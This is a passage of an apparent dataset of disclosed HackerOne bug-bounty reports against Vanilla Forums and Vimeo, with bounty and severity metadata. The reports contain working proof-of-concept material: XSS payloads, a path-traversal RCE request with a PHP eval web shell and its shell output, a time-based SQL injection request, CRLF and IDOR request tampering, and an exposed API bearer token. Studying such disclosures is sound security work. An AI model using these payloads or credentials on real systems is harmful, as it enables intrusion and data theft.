Code 82 BytesWrap lines Copy Download1https://rinkerboats.vanillacommunities.com/home/leaving?Target=https://google.com/
which used to redirect the users to external websites now this is good because you tell the user where he will be redirected on the above link the message will be
Code 90 BytesWrap lines Copy Download1You are now leaving Rinker Boat Company. Click the link to continue to https://google.com/
and he will click on the link to be redirected now I found a way to spoof this process to show a wrong domain to the user this way is RTLO (Right to Left Override ) this makes the text wrote from the right to left for example if we have flex if we use RTLO it will be xelf but the website will see it as flex so this is an issue because I can do it with a domain which will spoof the process like that
Code 92 BytesWrap lines Copy Download1https://rinkerboats.vanillacommunities.com/home/leaving?Target=https://%E2%80%AE@moc.rettiwt
the message will be
Code 92 BytesWrap lines Copy Download1You are now leaving Rinker Boat Company. Click the link to continue to https://@moc.rettiwt.
but when the user clicks on https://.twitter.com@ he will be redirected to https://moc.rettiwt/ this can be used to spoof the process and redirect the users to other websites.
similar report #299403
POC:
Image F483412: rtlo_spoof.jpg 81.22 KiBZoom in Zoom out Copy Download
Image F483411: redirect.jpg 16.08 KiBZoom in Zoom out Copy Download
Video:
Video F483421: rtlo_spoofing.mp4 1.16 MiBZoom in Zoom out Copy Download
Fix:
you can easily block any URL encoding characters or filter them.
Impact
This bug can be used to spoof the users using your website to redirect them to unsafe websites.3 attachments:F483411: redirect.jpgF483412: rtlo_spoof.jpgF483421: rtlo_spoofing.mp4",https://hackerone.com/reports/563268,Quebec,Canada,Montreal,2019,5,3,11,51
Vanilla,11-50,0.0,under-1m,$300.00,High,8.8,Cross-site Scripting (XSS) - Stored,Stored XSS in vanilla,"alb3r7  submitted a report to Vanilla.Feb 15th (4 years ago)Summary:
There is a stored XSS in the latest version 2.8 of vanilla. Attack with post privileges can trigger this.
Description:
In last report 481360, I found a XSS cause by Format. But in lastest version 2.8, the default Format of Discussion and Comment is Rich. In this Format, we can insert a Link which hasn't be sanitized
Steps to reproduce:

Log in and Click New Discussion
set the title and the content as anything you want
Post Discussion and Intercept request with Burpsuite
Modify the param Body as [{""insert"":""\n""},{""insert"":{""embed-external"":{""data"":{""type"":""link"",""url"":""http://localhost"",""name"":""name"",""body"":""body"",""photoUrl"":""photourl'onerror=alert(1) '"",""timestamp"":""time\""onmouseover=alert(2) \"""",""humanTime"":""humentime""}}}}]
the the XSS vector will be triggered

Anything else we should know?
Code Analysis
the root cause is in \library\Vanilla\Formatting\Embeds\LinkEmbed.php  
Code 771 BytesWrap lines Copy Download1    public function renderData(array $data): string {
2        $url = $data['url'] ?? null;
3        $name = $data['name'] ?? null;
4        $body = $data['body'] ?? null;
5        $photoUrl = $data['photoUrl'] ?? null;
6        $timestamp = $data['timestamp'] ?? null;
7        $humanTime = $data['humanTime'] ?? null;
8
9        if ($photoUrl) {
10            $photoUrlEncoded = htmlspecialchars($photoUrl);
11            $image = ""<img src='$photoUrlEncoded' class='embedLink-image' aria-hidden='true'>"";
12        } else {
13            $image = """";
14        }
15
16        if ($timestamp && $humanTime) {
17            $timestampAsMeta = ""<time class=\""embedLink-dateTime metaStyle\"" dateTime=\""$timestamp\"">$humanTime</time>"";
18        } else {
19            $timestampAsMeta = """";
20        }
photoUrl, timestamp, HumanTime  should be sanitized properly
Impact
Stored XSS2 attachments:F424361: 11.pngF424362: 22.png",https://hackerone.com/reports/496405,Quebec,Canada,Montreal,2019,2,15,8,57
Vanilla,11-50,0.0,under-1m,$300.00,High,7.95,Cross-site Scripting (XSS) - Stored,Stored XSS in vanilla,"alb3r7  submitted a report to Vanilla.Jan 17th (4 years ago)Summary:
There is a stored XSS in the latest version 2.6.4 of vanilla.  Attack with post privileges can trigger this.
Description:
This is a feature that user can post content in  markdown format. And the content and format type is inserted into database without check the format param. So attack can modify the format type. When the milicious content render by Gdn_format::to($content, $format), it will bypass the XSS filter.
File library/core/class.format.php
Code 538 BytesWrap lines Copy Download1    public static function to($mixed, $formatMethod) {
2        // Process $Mixed based on its type.
3        if (is_string($mixed)) {
4            if (in_array(strtolower($formatMethod), self::$SanitizedFormats) && method_exists('Gdn_Format', $formatMethod)) {
5                $mixed = self::$formatMethod($mixed);
6            } elseif (function_exists('format'.$formatMethod)) {
7                deprecated('format'.$formatMethod, 'gdn_formatter_'.$formatMethod, '2015-10-26');
8                $formatMethod = 'format'.$formatMethod;
9......
So when we set the format as 'String', it will call function formatString in functions.general.php. This function will not filter xss vector.
Steps to reproduce:

Log in and Click New Discussion
set content as x<img src=x onerror=alert(document.cookie)>x
Post Discussion and  Intercept request with Burpsuite
Modify the param Format as String
the the XSS vector will be triggered

Anything else we should know?
Every input field support format may be vulnerable
Impact
Stored XSS2 attachments:F407928: 1.pngF407929: 2.png",https://hackerone.com/reports/481360,Quebec,Canada,Montreal,2019,1,17,12,15
Vanilla,11-50,0.0,under-1m,$300.00,High,8.2,Cross-site Scripting (XSS) - Stored,Unsanitized input in email field,"mr_r0w07  submitted a report to Vanilla.Jun 5th (4 years ago)Users are able to inject javascript payloads in the email field which leads to stored XSS
Steps to produce :

Go to profile and add  ""<script>alert(1)</script>""@example.com as your email .
We can see the popup at https://discuss.paytm.com/profile/preferences/profilename

Impact
Users can store malicious payloads and ask any moderator to review their profile and popup will be executed leading to cookie theft and other attacks.",https://hackerone.com/reports/361957,Quebec,Canada,Montreal,2018,6,5,2,55
Vanilla,11-50,0.0,under-1m,$900.00,High,8.0,Path Traversal,Vanilla Forums AddonManager getSingleIndex Directory Traversal File Inclusion Remote Code Execution Vulnerability,"mr_me  submitted a report to Vanilla.Sep 18th (4 years ago)Summary:
An authenticated admin user can trigger a directory traversal to require call leading to local file inclusion which can allow an attacker to gain remote code execution.
Notes:

You need to have an admin session to run this poc.
You can use the directory traversal to reach outside of the web root
Even though this poc uses the unserialize bug, please note, the underlying root cause is the directory traversal and no check is made on $type.
Don't forget to cleanup the -index.php file in the conf directory
I had to adjust the pop chain slightly and add double digits to the number of properties for the Gdn_ConfigurationSource class otherwise the application will not parse the serialized payload properly. I'm not sure why, haven't bothered to investigate it since I found an easy work around.

Analysis:
Inside of the applications/dashboard/controllers/class.addoncachecontroller.php file, we can see there is a reachable function verify() which accepts a type parameter.
Code 643 BytesWrap lines Copy Download1    /**
2     * Verify the addon cache is current.
3     *
4     * @param string $type
5     * @throws Exception if no type specified.
6     */
7    public function verify($type) {
8        $this->permission('Garden.Settings.Manage');
9
10        if ($type === null) {
11            throw new Exception('Type required');
12        }
13
14        $cached = Gdn::addonManager()->lookupAllByType($type);              // 1
15        $current = Gdn::addonManager()->scan($type);
16
17        $new = array_keys(array_diff_key($current, $cached));
18        $invalid = array_keys(array_diff_key($cached, $current));
19
20        $updateRequired = (count($new) || count($invalid));
At [1] we can reach the call to lookupAllByType() on the addonManager class with an attacker controlled type.
Code 2.35 KiBWrap lines Copy Download1class AddonManager {
2
3    ...
4
5    private function typeUsesMultiCaching($type) {
6        return $type === Addon::TYPE_ADDON;
7    }
8
9    ...
10
11    /**
12     * Get all of the addons of a certain type.
13     *
14     * @param string $type One of the **Addon::TYPE_*** constants.
15     * @return array Return an array of addon indexed by their keys.
16     */
17    public function lookupAllByType($type) {                                                                // 2
18        if ($this->typeUsesMultiCaching($type)) {                                                           // 3
19            $this->ensureMultiCache();
20            return $this->multiCache;
21        } else {
22            $index = $this->getSingleIndex($type);                                                          // 4
23            $addons = [];
24            foreach ($index as $addonDirName => $addonDirPath) {
25                try {
26                    $addon = $this->lookupSingleCachedAddon($addonDirName, $type);
27                    $addons[$addon->getKey()] = $addon;
28                } catch (\Exception $ex) {
29                    trigger_error(""The $type in $subdir is invalid and will be skipped."", E_USER_WARNING);
30                    // Clear the addon out of the index.
31                    $this->deleteSingleIndexKey($type, $addonDirName);
32                }
33            }
34            return $addons;
35        }
36    }
37
38    ...
39
40    /**
41     * Get the index for an addon type that is cached by single addon.
42     *
43     * @param string $type One of the **Addon::TYPE_*** constants.
44     * @return array Returns the index mapping [addonDirName => addonDirPath]
45     */
46    private function getSingleIndex($type) {                                                                // 5
47        if (!isset($this->singleIndex[$type])) {
48            $cachePath = ""$type-index.php"";                                                                 // 6
49
50            if ($this->isCacheEnabled() && is_readable(""$this->cacheDir/$cachePath"")) {                     // 7
51                $this->singleIndex[$type] = require ""$this->cacheDir/$cachePath"";                           // 8
52            } else {
53                $addonDirs = $this->scanAddonDirs($type);
54
55                $this->saveArrayCache($cachePath, $addonDirs);
56
57                $this->singleIndex[$type] = $addonDirs;
58            }
59        }
60        return $this->singleIndex[$type];
61    }
At [2] we enter the function and at [3] we don't enter the first code block as type is != to Addon::TYPE_ADDON. Then at [4] we call getSingleIndex() using our controlled type. Then at [5] we enter the function, at [6] we set the $cachePath variable which is pre-pended with the attackers string. Then at [7] we land in a check if the file path is readable, and if it is, we trigger a file inclusion using require.
Note that there is no protection here for traversals and as such, a remote, context dependent attacker can leverage this for rce. However, this bug requires that an attacker has the following primitive:

They can upload a file in any directory with the name ""*-index.php"" containing some PHP code.

Whilst this sounds rare, actually, it's very possible to do this on most applications. Since Vanilla doesn't allow this by default, I have marked this bug as a medium (not high), but you should be extra careful regarding inclusion functions.
Exploitation:
As stated above, we need a write primitive to write an *-index.php file somewhere on the filesystem with our code. So I leveraged the unserialize() vulnerability from a previous report to get that primitive.
Then, I used the file inclusion and traversed a single directory into the conf directory. Note the traversals here, thats the underlying issue
Code 358 BytesWrap lines Copy Download1POST /index.php?p=/dashboard/addoncache/verify/..%252fconf%252f HTTP/1.1
2Host: 172.16.175.143
3Cookie: Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U
4Connection: close
5Content-Type: application/x-www-form-urlencoded;
6Content-Length: 61
7
8c=system('id');die();
response from the webserver looks like this:
Code 345 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Tue, 18 Sep 2018 14:59:01 GMT
3Server: Apache/2.4.29 (Ubuntu)
4Set-Cookie: Vanilla-tk=gLApzQGeSNA2zPpI%3A2%3A1537282741%3A0e76e0b87aee826b7a810b37c505b34e; path=/; HttpOnly
5P3P: CP=""CAO PSA OUR""
6Content-Length: 54
7Connection: close
8Content-Type: text/html; charset=UTF-8
9
10uid=33(www-data) gid=33(www-data) groups=33(www-data)
Of course, as always, I provided a fully functional exploit. The interesting part about this exploit is that I do not need to repair the constants.php file since we a writing a whole new file (which means I don't damage the system).
The clean up is removing the written file:
Code 209 BytesWrap lines Copy Download1steven@pluto:/var/www/html$ cat conf/-index.php 
2<?php if (!defined('APPLICATION')) exit();
3$a=eval($_POST[c]);//[''] = '';
4
5// Last edited by admin (172.16.175.1)2018-09-18 14:43:21steven@pluto:/var/www/html$
Example:
Code 668 BytesWrap lines Copy Download1saturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MzkyMDMxMzMsImlhdCI6MTUzNjYxMTEzMywic3ViIjoyfQ.Hgphc_1Vn2uEqFgFjxtc2s9kGYCP6xC4QRx5NJJwN_U
2(+) targeting: http://172.16.175.143
3(+) created a shell at conf/-index.php!
4(+) we can only reach it with the file inclusion!
5(+) dropping to a fake shell!
6www-data@pluto:/var/www/html$ id;uname -a
7uid=33(www-data) gid=33(www-data) groups=33(www-data)
8Linux pluto 4.15.0-33-generic #36-Ubuntu SMP Wed Aug 15 16:00:05 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
9
10www-data@pluto:/var/www/html$ exit
11
12saturn:vanilla_forums_addoncache_verify_lfi_rce mr_me$
Impact
A context dependent attacker can achieve remote code execution.1 attachment:F347841: vanilla_forums_addoncache_verify_lfi_rce.zipSummary by mr_meAn authenticated admin user can trigger a directory traversal to a require call leading to local file inclusion which can allow an attacker to gain remote code execution.",https://hackerone.com/reports/411140,Quebec,Canada,Montreal,2018,9,18,17,35
Vanilla,11-50,0.0,under-1m,$600.00,Critical,9.5,SQL Injection,Vanilla SQL Injection Vulnerability,"balis0ng  submitted a report to Vanilla.May 18th (5 years ago)Summary:
There is a SQL injection vulnerability in the vanilla, an attacker can use this vulnerability to obtain database information.
Description:
We download the program from https://github.com/vanilla/vanilla and install.
In applications/dashboard/controllers/class.profilecontroller.php:274
Code 524 BytesWrap lines Copy Download1public function deleteInvitation($invitationID) {
2        $this->permission('Garden.SignIn.Allow');
3
4        if (!$this->Form->authenticatedPostBack()) {
5            throw forbiddenException('GET');
6        }
7
8        $invitationModel = new InvitationModel();
9        $invitationModel->delete($invitationID);
10        $this->informMessage(t('The invitation was removed successfully.'));
11        $this->jsonTarget("".js-invitation[data-id=\""{$invitationID}\""]"", '', 'SlideUp');
12
13        $this->render('Blank', 'Utility');
14    }
The value of this $invitationID is controllable by us. It is worth noting: it can be an array。
You can see that the value of $invitationID was brought into the delete function.
applications/dashboard/models/class.invitationmodel.php:225
Code 323 BytesWrap lines Copy Download1    public function delete($where = [], $options = []) {
2        if (is_numeric($where)) {
3            deprecated('InvitationModel->delete(int)', 'InvitationModel->deleteID(int)');
4            $result = $this->deleteID($where, $options);
5            return $result;
6        }
7        parent::delete($where, $options);
8    }
The $where parameter of this function is controllable by us. It was brought into the delete function and we traced it.
Code 950 BytesWrap lines Copy Download1 public function delete($where = [], $options = []) {
2        if (is_numeric($where)) {
3            deprecated('Gdn_Model->delete(int)', 'Gdn_Model->deleteID()');
4            $where = [$this->PrimaryKey => $where];
5        }
6
7        $resetData = false;
8        if ($options === true || val('reset', $options)) {
9            deprecated('Gdn_Model->delete() with reset true');
10            $resetData = true;
11        } elseif (is_numeric($options)) {
12            deprecated('The $limit parameter is deprecated in Gdn_Model->delete(). Use the limit option.');
13            $limit = $options;
14        } else {
15            $options += ['rest' => true, 'limit' => null];
16            $limit = $options['limit'];
17        }
18
19        if ($resetData) {
20            $result = $this->SQL->delete($this->Name, $where, $limit);
21        } else {
22            $result = $this->SQL->noReset()->delete($this->Name, $where, $limit);
23        }
24        return $result;
25    }
The $where parameter was brought into $result = $this->SQL->noReset()->delete($this->Name, $where, $limit);
traced it:
library/database/class.sqldriver.php:333
Code 860 BytesWrap lines Copy Download1    public function delete($table = '', $where = '', $limit = false) {
2        if ($table == '') {
3            if (!isset($this->_Froms[0])) {
4                return false;
5            }
6
7            $table = $this->_Froms[0];
8        } elseif (is_array($table)) {
9            foreach ($table as $t) {
10                $this->delete($t, $where, $limit, false);
11            }
12            return;
13        } else {
14            $table = $this->escapeIdentifier($this->Database->DatabasePrefix.$table);
15        }
16
17        if ($where != '') {
18            $this->where($where);
19        }
20
21        if ($limit !== false) {
22            $this->limit($limit);
23        }
24
25        if (count($this->_Wheres) == 0) {
26            return false;
27        }
28
29        $sql = $this->getDelete($table, $this->_Wheres, $this->_Limit);
30
31        return $this->query($sql, 'delete');
32    }
The $where parameter was brought into $this->where function
Code 817 BytesWrap lines Copy Download1   public function where($field, $value = null, $escapeFieldSql = true, $escapeValueSql = true) {
2        if (!is_array($field)) {
3            $field = [$field => $value];
4        }
5
6        foreach ($field as $subField => $subValue) {
7            if (is_array($subValue)) {
8                if (count($subValue) == 1) {
9                    $firstVal = reset($subValue);
10                    $this->where($subField, $firstVal);
11                } else {
12                    $this->whereIn($subField, $subValue);
13                }
14            } else {
15                $whereExpr = $this->conditionExpr($subField, $subValue, $escapeFieldSql, $escapeValueSql);
16                if (strlen($whereExpr) > 0) {
17                    $this->_where($whereExpr);
18                }
19            }
20        }
21        return $this;
22    }
As mentioned above, the value of $where is controllable by us and can be an array.
This means that we can control the field name in the where statement.
So we can fill in the field name in the SQL injection statement.
Follow-up operation will not say much.
## Steps to reproduce:
1.The exploit requires users to log in. We can log in as an ordinary user.
2.The POST method is required to access the deleteInvitation function. Due to the existence of the TransientKey, we cannot directly send a POST request.But we can get TransientKey by other means. For example, grab a normal POST message and change it to a vulnerability URL.
3.Here I use delay injection, using the benchmark function in mysql. Different environment delay time is not the same.
##The poc:
Code 923 BytesWrap lines Copy Download1POST /profile/deleteInvitation?invitationID[1%3dbenchmark(40000000,sha(1))+and+1]=balisong HTTP/1.1
2Host: localhost
3Content-Length: 29
4Pragma: no-cache
5Cache-Control: no-cache
6Accept: application/json, text/javascript, */*; q=0.01
7Origin: http://localhost
8X-Requested-With: XMLHttpRequest
9User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
10Content-Type: application/x-www-form-urlencoded; charset=UTF-8
11Referer: http://localhost/profile/
12Accept-Language: zh-CN,zh;q=0.9
13Cookie: Drupal.toolbar.collapsed=0; hd_sid=udVsUw; XDEBUG_SESSION=PHPSTORM; Vanilla=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MjkyMDE2NTAsImlhdCI6MTUyNjYwOTY1MCwic3ViIjo3fQ.of1gk2CHyzeomQNSMWz_8WXXi_FfCwKxyctVWZlemKI; Vanilla-Vv=1526609650; Vanilla-tk=caEyM0dSVZC0xDhU%3A7%3A1526609650%3Ab23a6efff2dd9f026ffa87db10ba4119
14Connection: close
15
16TransientKey=caEyM0dSVZC0xDhU
17
Delayed 9s on my own machine。
as the picture shows:
1.jpg (F298931)
## Anything else we should know?
Impact
an attacker can use this vulnerability to obtain database information.
The hacker selected the SQL Injection weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
Verified
Yes
What exploitation technique did you utilize?
Time delay
Please describe the results of your verification attempt.
observed a 9+ second time delay1 attachment:F298931: 1.jpgSummary by balis0ngBecause the value of invitationID is controlled by the attacker, an attacker can construct an array and perform SQL injection.
Credit: ADLab of Venustech",https://hackerone.com/reports/353784,Quebec,Canada,Montreal,2018,5,18,4,59
Vanilla,11-50,0.0,under-1m,$150.00,Medium,4.3,Information Disclosure,Web cache deception attack on https://open.vanillaforums.com/messages/all,"ronr  submitted a report to Vanilla.Jun 1st (3 years ago)I have found a Vulnerability in vanilla forums which called Web cache deception attack.
Web Cache Deception Attack
Websites often tend to use web cache functionality to store files that are often retrieved, to reduce latency from the web server.
Websites often tend to use web cache functionality (for example over a CDN, a load balancer, or simply a reverse proxy). The purpose is simple: store files that are often retrieved, to reduce latency from the web server.
When accessing a URL like http://www.example.com/home.php/non-existent.css
A GET request to that URL will be produced by the browser.  The server returns the content of http://www.example.com/home.php. And yes, the URL remains http://www.example.com/home.php/non-existent.css. The HTTP headers will be the same as for accessing http://www.example.com/home.php directly: same caching headers and same content type (text/html, in this case).
The web cache servre saves the returned page in the server's cache. Then the attacker can go to the url: http://www.example.com/home.php/non-existent.css and the page of the victim will be presented with the victim's sensitive information (The page content).
The dangerous part in this attack, unlike phishing attacks, is that the url isn't looks suspicious at all.  It looks like a normal url from the original website, so the victim thinks that it is ok to click on the link.
Steps:

The attacker sends the following link to the victim: https://open.vanillaforums.com/messages/all/non-existent.css
The victim opens the link and the inbox page will be loaded normally. (The web cache server then saves this page)
The attacker open the same link (https://open.vanillaforums.com/messages/all/non-existent.css), and the inbox page of the victim with all his private contant is loaded.

If you need a video to understand it better, ask me and I will send you one.
Impact
The attacker can achieve all the private content of a specific victim, without the victim knowing about it.",https://hackerone.com/reports/593712,Quebec,Canada,Montreal,2019,6,1,17,27
Vanilla,11-50,0.0,under-1m,$300.00,High,7.1,Cross-site Scripting (XSS) - Stored,XSS For Profile Name,"mindingdata  submitted a report to Vanilla.Aug 15th (3 years ago)Summary:
In short, if your username is something as simple as <script>alert(1)</script> this will not be filtered when viewing your profile page. The unfiltered script alert is echo'd underneath your image in your profile. This can be viewed by anyone viewing your profile (Although in some cases the browser will attempt to block it so you might not see it immediately - but it will show in the console etc).
While you are unable to change your username to have <> tags via the web, I noticed if I edited the name directly in the database I could get it to prompt. 
From there I found two ways to make your name accept tags. 

via the API, you can create a user with a script tag as a name and it goes through fine. 
via social logins. Although Facebook, Twitter and Google all block <> tags in their ""Name"" field, things like Github and Steam do not and the social login plugins take the ""name"" wholesale without any filtering. 

Description:
Steps to reproduce:
You can ofcourse just edit the name of a user in the gdn_user table if you want to short circuit it. Otherwise... 

Call the API (Even via Swagger in the admin panel) with the following : (RoleId may need to be changed to suite local install)

{
""bypassSpam"": false,
""email"": ""test@test.com"",
""emailConfirmed"": true,
""name"": ""<script>alert(1)</script>"",
""password"": ""P@ssw0rd"",
""photo"": """",
""roleID"": [
8
]
}

Login as this user/view this users profile via the front end web. You should see the alert. 

(And again alternatively you can set up OpenID/Social Logins with a provider that also allows script tags in the name and it will come through also)
Anything else we should know?
While the web does block it so the exploit relies on either an API integration or a social login, I think relying on third parties to block script tags on their end so they don't get into the Vanilla DB is probably pretty dangerous. If Vanilla has inbuilt support for something like Github this would be a much larger problem etc.
Impact
Standard XSS rules applydexterr   posted a comment. Aug 15th (3 years ago)Thank you for the report. We will investigate and reply to you shortly.linc   updated the severity from medium to high (7.1). Aug 15th (3 years ago)dexterr   changed the status to Triaged. Aug 16th (3 years ago)I have triaged this ticket as valid. Thank you for reporting it.mindingdata   posted a comment. Oct 15th (3 years ago)Hi guys, where did we get with this one? Vanilla  rewarded mindingdata with a $300 bounty. Oct 16th (3 years ago)initvector   closed the report and changed the status to Resolved. Nov 21st (3 years ago)mindingdata   requested to disclose this report. Feb 24th (3 years ago)  This report has been disclosed. Mar 25th (3 years ago)",https://hackerone.com/reports/674426,Quebec,Canada,Montreal,2019,8,15,9,48
Vimeo,1001-5000,0.0,50m-100m,"$1,500.00",High,7.95,Improper Access Control - Generic,Possibility to overwrite any file in the vpe.cdn.vimeo.tv leads to the Stored XSS for the all customers on the embed.vhx.tv,"sp1d3rs  submitted a report to Vimeo.Nov 29th (4 years ago)Summary by sp1d3rsIt was possible to write (and overwrite) arbitrary files to the CDN ( vpe.cdn.vimeo.tv ) used for JS scripts delivery on the various in-scope assets using the PUT method with blank or application/octet-stream Content-Type. Any other Content-Type caused auth error from Google Cloud Storage side.
Example:
Code 149 Bytes1PUT /something.js HTTP/1.1
2Host: vpe.cdn.vimeo.tv
3Content-Type: application/octet-stream
4Content-Length: 10
5Connection: close
6
7alert(document.domain)
could create something.js with XSS payload or overwrite something.js if it already exist.
The issue was fixed fast. Thanks to the VHX team for the great experience, awesome communication and the bounty!",https://hackerone.com/reports/452559,New York,United States,New York,2018,11,29,14,55
Vimeo,1001-5000,0.0,50m-100m,$250.00,No value,0.0,Cross-Site Request Forgery (CSRF),[URGENT ISSUE] Add or Delete the videos in watch later list of any user .,"ckmk44  submitted a report to Vimeo.Mar 22nd (8 years ago)This could be done using vimeo api .I used the access token of IOS vimeo app .An attacker could remotely add and delete the videos in watchlater list of any user with out any permission of user.
get the watch later list:
GET /users/<any_user_id>/watchlater/ HTTP/1.1
Host: api.vimeo.com
Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
Accept-Encoding: gzip, deflate
Accept: application/vnd.vimeo.*+json; version=3.3
Cookie: utma=18302654.1532978367.1426999777.1426999777.1426999777.1; utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
Accept-Language: en;q=1, hi;q=0.9
Connection: keep-alive
Proxy-Connection: keep-alive
User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)
post any video to watchlater list:
PUT /users/<any_user_id>/watchlater/<any_video_id> HTTP/1.1
Host: api.vimeo.com
Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
Accept-Encoding: gzip, deflate
Accept: application/vnd.vimeo.*+json; version=3.3
Cookie: utma=18302654.1532978367.1426999777.1426999777.1426999777.1; utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
Accept-Language: en;q=1, hi;q=0.9
Connection: keep-alive
Proxy-Connection: keep-alive
User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)
delete videos from watchlater list
DELETE /users/<any_user_id>/watchlater/<any_video_id> HTTP/1.1
Host: api.vimeo.com
Authorization: Bearer 675b8f568f2fe06ec89b30bab0195f95
Accept-Encoding: gzip, deflate
Accept: application/vnd.vimeo.*+json; version=3.3
Cookie: utma=18302654.1532978367.1426999777.1426999777.1426999777.1; utmv=18302654.|3=ms=1=1; __utmz=18302654.1426999777.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); vuid=811402013.989751578
Accept-Language: en;q=1, hi;q=0.9
Connection: keep-alive
Proxy-Connection: keep-alive
User-Agent: Vimeo/1006 (iPhone; iOS 8.1.2; Scale/2.00; Version 5.2.0)
above dump can be used for proof of concept .fix this issue asap.
I will message the proof of concept as a video",https://hackerone.com/reports/52982,New York,United States,New York,2015,3,22,12,7
Vimeo,1001-5000,0.0,50m-100m,$500.00,No value,0.0,None,[vimeopro.com] CRLF Injection,"bobrov  submitted a report to Vimeo.Dec 12th (8 years ago)PoC (for any browser other than FireFox)
http://www.vimeopro.com/crlftest%0dSet-Cookie:test=test;domain=.vimeopro.com
HTTP Response:
HTTP/1.1 301 Moved Permanently\r\n
Date: Fri, 12 Dec 2014 19:28:49 GMT\r\n
Server: Apache\r\n
Location: http://vimeopro.com/crlftest\r
Set-Cookie:test=test;domain=.vimeopro.com\r\n
Result:
Creating a cookie-param ""test=test""",https://hackerone.com/reports/39181,New York,United States,New York,2014,12,12,19,33
Vimeo,1001-5000,0.0,50m-100m,$250.00,No value,0.0,Privilege Escalation,A user can add videos to other user's private groups,"satishb3  submitted a report to Vimeo.Mar 10th (8 years ago)It is possible for a user to add videos to other user's private groups. 
Steps to verify:


Log into vimeo.com as Alice. Create a new group (lets say, AlicePrivateGroup with group id 301924) and choose 'Only members can see this group' setting.


Login as Bob and create a new group (lets say, BobGroup with group id 300754). If Bob access the AlicePrivateGorup - https://vimeo.com/groups/301924/, it displays 'Sorry, this Group is private. You do not have permission to view this Group' message.


View any of the Bob videos and click on collections. 


In the collections-> groups section, check BobGroup and intercept this request using burp proxy. Intercepted request looks like, 
 POST /118099933?action=adder HTTP/1.1
Host: vimeo.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
[...]
 action=toggle_collection&type=group&id=300754&toggle=add&token=...


In the intercepted request, replace the id value with AlicePrivateGorup id (301924). Modified request looks like, 
POST /118099933?action=adder HTTP/1.1
Host: vimeo.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
[...]
action=toggle_collection&type=group&id=301924&toggle=add&token=...


Send the modified request to the server. It adds Bob video to AlicePrivateGorup. To confirm, login as Alice and look at the AlicePrivateGorup videos.


It is also possible for a user to add videos to other user's groups without joining the group just by changing the group id value in the above request.",https://hackerone.com/reports/50786,New York,United States,New York,2015,3,10,10,32
Vimeo,1001-5000,0.0,50m-100m,$250.00,No value,0.0,Privilege Escalation,A user can edit comments even after video comments are disabled,"satishb3  submitted a report to Vimeo.Mar 10th (8 years ago)A user can escalate privileges and edit his previous comments, when comments are disabled for a video.
Steps to verify:


Log into vimeo.com as Alice. Upload a video (say, video id - 118026546) and allow anyone to leave comments for that video .


Login as Bob and navigate to the video URL - https://vimeo.com/118026546.


Leave a comment. Edit that comment and capture the request using burp proxy. Captured request looks like -
POST /118026546 HTTP/1.1
Host: vimeo.com
[...]
text=abcd&action=edit_comment&comment_id=12984882&token=[...]


From Alice account, change the video settings and do not allow anyone to comment.


From Bob account, access the video url (https://vimeo.com/118026546) and it displays 'Sorry,     comments have been disabled by the owner of this video' message. At this point Bob can't add new comments or edit previous comments. However, Bob can edit his previous comments by replaying the request captured in step 3.",https://hackerone.com/reports/50776,New York,United States,New York,2015,3,10,9,12
Vimeo,1001-5000,0.0,50m-100m,$250.00,No value,0.0,Privilege Escalation,A user can enhance their videos with paid tracks without buying the track,"satishb3  submitted a report to Vimeo.Mar 11th (8 years ago)It is possible to enhance videos with paid tracks without buying the track.
Steps to verify:


Log into vimeo.com and navigate to https://vimeo.com/enhancer.


Click on any paid music track and note down the track id from the URL (ex: https://vimeo.com/musicstore/track/110272/talaky-instrumental-by-gayle-cloud : Track id is: 110272, cost: $1.99). 


Back to the enhancer. Choose a free track (say, girl with a motory cycle track, id: 84469) and click on the video symbol to enhance video with this track.


Choose the video to enhance. Click on Enhance button and intercept this request using burp proxy. Intercepted request looks like,
POST /enhancer HTTP/1.1
Host: vimeo.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
[...]
action=save&token=...&clip_id=118026546&track_id=84469&job_data=....


Replace the track id in the above request with paid track value (say, 110272). Modified request looks like, 
POST /enhancer HTTP/1.1
Host: vimeo.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
[...]
action=save&token=..&clip_id=118026546&track_id=110272&job_data=...


Send the modified request to the server. It creates the enhanced video with paid track without buying it.",https://hackerone.com/reports/50941,New York,United States,New York,2015,3,11,8,40
Vimeo,1001-5000,0.0,50m-100m,$500.00,No value,0.0,Privilege Escalation,A user can post comments on other user's private videos,"satishb3  submitted a report to Vimeo.Mar 10th (8 years ago)It is possible for a user to post comments on other's private videos.
Steps to verify:


Log into www.vimeo.com as Alice and create a video (say, AliceVideo with id - 118026546) with 'Allow anyone to see my videos' setting.


Login as Bob and create an album (say, BobAlbum with album id 3295969). 


From Bob, navigate to the AliceVideo URL - https://vimeo.com/118026546. Click collections and add video to BobAlbum.


